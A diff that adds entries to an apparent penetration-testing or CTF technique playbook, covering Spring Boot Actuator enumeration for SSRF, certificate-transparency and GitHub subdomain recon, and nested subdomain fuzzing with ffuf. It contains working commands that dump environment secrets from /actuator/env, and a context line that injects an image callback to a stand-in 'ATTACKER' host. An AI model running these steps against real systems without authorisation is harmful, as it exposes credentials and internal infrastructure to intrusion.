@@ -206,3 +206,99 @@ curl -X POST "http://target/api/generate-report" \
 # wkhtmltopdf user-agent: "Mozilla/5.0 ... wkhtmltopdf"
 # Check via callback: inject <img src="http://ATTACKER:8080/identify"> and inspect UA
 ```
+
+### Spring Boot Actuator Recon → SSRF Entry Point Discovery [added: 2026-05]
+- **Tags:** #SSRF #SpringBoot #Actuator #InfoDisclosure #CloudConfig #ProxyEndpoint #EnvLeak #S3Bucket
+- **Trigger:** Java web application responds to `/actuator/health`, `/actuator/env`, or `/actuator/mappings` — common in Spring Boot apps with default actuator config
+- **Prereq:** Spring Boot app with actuator endpoints exposed (publicly or with weak/known basic auth credentials)
+- **Yields:** Internal env vars (S3 bucket names, DB URLs, API keys), full endpoint map (reveals internal proxy or debug endpoints), SSRF surface identification
+- **Opsec:** Low
+- **Context:** Spring Boot Actuator endpoints are enabled by default and frequently left exposed. `/actuator/env` dumps all environment variables including cloud resource names. `/actuator/mappings` reveals every registered HTTP endpoint — including internal proxy or admin endpoints that accept a `url` parameter, creating a direct SSRF vector.
+- **Payload/Method:**
+  ```bash
+  # Enumerate actuator endpoints (try with and without basic auth)
+  curl -s https://target/actuator/ | jq .
+  curl -s -u 'ctf:password' https://target/actuator/
+
+  # Extract environment variables — look for S3 bucket names, DB URLs, API keys
+  curl -s -u 'user:pass' https://target/actuator/env | jq '.propertySources[].properties'
+
+  # Enumerate all mapped endpoints — look for /proxy, /fetch, /request, /debug
+  curl -s -u 'user:pass' https://target/actuator/mappings | jq '.contexts[].mappings.dispatcherServlets.dispatcherServlet[].predicate'
+
+  # Common actuator endpoints to try
+  /actuator/health        # App status
+  /actuator/env           # All env vars (bucket names, secrets)
+  /actuator/mappings      # Full endpoint map → identify SSRF proxy
+  /actuator/beans         # Spring bean definitions
+  /actuator/configprops   # All config properties
+  /actuator/info          # App metadata
+  /actuator/loggers       # Log level manipulation (can force debug output)
+  /actuator/httptrace     # Recent HTTP requests (may leak auth headers/tokens)
+  ```
+
+### Certificate Transparency (crt.sh) + GitHub CNAME History Subdomain Recon [added: 2026-05]
+- **Tags:** #Recon #SubdomainEnum #CertificateTransparency #crtsh #GitHub #CNAME #InternalSubdomain #InfraDiscovery
+- **Trigger:** Target domain identified (e.g., `target-corp.net`) but no obvious subdomains visible; need to discover staging, internal, or historical subdomains
+- **Prereq:** Target domain name; public internet access to crt.sh and GitHub search; optional: git history of discovered repos
+- **Yields:** Historical and active subdomain list including internal/staging domains (e.g., `testing.internal.target.com`, wildcard patterns), CNAME aliases pointing to internal or decommissioned infrastructure
+- **Opsec:** Low
+- **Context:** Certificate Transparency logs (crt.sh) record every TLS certificate issued, including wildcards and internal-sounding names developers shouldn't have exposed. GitHub repositories frequently contain CNAME config files (e.g., `CNAME` in GitHub Pages repos, Sphinx/MkDocs `conf.py`, CI config files) with domain aliases. Examining git history often reveals previously-used domains that were renamed — these may still resolve or hint at internal naming conventions.
+- **Payload/Method:**
+  ```bash
+  # Step 1 — Certificate Transparency search (replace target-corp.net with target domain)
+  # Option A: crt.sh web UI
+  curl -s "https://crt.sh/?q=%25.target-corp.net&output=json" | jq -r '.[].name_value' | sort -u
+
+  # Option B: subfinder (integrates crt.sh + many other sources)
+  subfinder -d target-corp.net -silent -all | tee subdomains.txt
+
+  # Step 2 — GitHub CNAME history search
+  # Search GitHub for domain references (finds CNAME files, config files, CI pipelines)
+  # In GitHub search: "target-corp.net" OR "hacme-corp.net" filetype:CNAME
+  # Also search: "target-corp.net" in:file path:CNAME
+
+  # Step 3 — Clone found repos and examine git history for CNAME changes
+  git log --all --oneline -- CNAME    # see when CNAME changed
+  git log -p -- CNAME                 # see each historical value
+
+  # Step 4 — Probe discovered internal subdomains
+  for sub in $(cat subdomains.txt); do
+    curl -s -o /dev/null -w "%{http_code} $sub\n" --max-time 5 "http://$sub" 2>/dev/null
+  done | grep -v "^000"
+  ```
+
+### Nested Subdomain Pattern Fuzzing via ffuf [added: 2026-05]
+- **Tags:** #Recon #SubdomainFuzzing #ffuf #NestedSubdomain #InternalDomain #VhostEnum #WildcardDNS #InfraDiscovery
+- **Trigger:** Known partial subdomain prefix or pattern discovered (e.g., from crt.sh wildcard cert `*.testing.internal.target.com`) but the first-level fuzzing position unknown
+- **Prereq:** Known subdomain suffix (e.g., `.testing.internal.target.com`) from cert transparency or git history + ffuf + subdomain wordlist
+- **Yields:** Specific active subdomains matching the pattern (e.g., `coding.pprod.testing.internal.target.com` returning HTTP 200)
+- **Opsec:** Med
+- **Context:** When crt.sh reveals a wildcard cert like `*.testing.internal.target.com`, the left-most label is unknown. Use ffuf to fuzz the position. Wordlists of 5000-10000 common subdomain labels (environments: prod, staging, pprod, dev; services: api, app, docs, coding) are most effective. For multi-level unknowns (e.g., `FUZZ1.FUZZ2.known.target.com`), run ffuf twice: first fuzz FUZZ2 with known suffix, then fuzz FUZZ1 with each discovered value.
+- **Payload/Method:**
+  ```bash
+  # Single-level nested fuzz (FUZZ replaces unknown leftmost label)
+  ffuf -u "http://FUZZ.testing.internal.target.com" \
+    -w /opt/wordlists/subdomain-wordlist.txt \
+    -mc 200,301,302 -s -t 50
+
+  # Multi-level: fuzz second label first (e.g., FUZZ.testing.internal.target.com)
+  ffuf -u "http://FUZZ.testing.internal.target.com" \
+    -w /opt/wordlists/n0kovo_subdomains.txt \
+    -mc 200,301,302 -s | tee level2_hits.txt
+
+  # Then fuzz first label against each hit (e.g., FUZZ.pprod.testing.internal.target.com)
+  while read hit; do
+    ffuf -u "http://FUZZ.$hit" \
+      -w /opt/wordlists/subdomain-wordlist.txt \
+      -mc 200,301,302 -s >> nested_hits.txt
+  done < level2_hits.txt
+
+  # Useful wordlists for nested env labels:
+  # SecLists: Discovery/DNS/subdomains-top1million-5000.txt
+  # n0kovo: https://github.com/n0kovo/n0kovo_subdomains
+  # Custom env words: prod,staging,pprod,dev,test,qa,internal,coding,api,docs
+
+  # Verify hits with curl
+  curl -si "http://coding.pprod.testing.internal.target.com" | head -5
+  ```
